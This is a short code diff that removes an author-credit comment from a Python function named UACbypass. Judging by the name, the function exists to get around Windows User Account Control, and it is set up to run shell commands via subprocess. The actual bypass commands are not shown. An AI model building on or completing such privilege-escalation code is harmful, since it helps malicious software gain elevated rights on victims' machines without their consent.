@@ -4,7 +4,7 @@ import subprocess
 import requests
 
 
-def UACbypass(method: int = 1) -> bool: # Hecho por c06packetplayerposlook en discord
+def UACbypass(method: int = 1) -> bool:
         if GetSelf()[1]:
             execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
             match method:
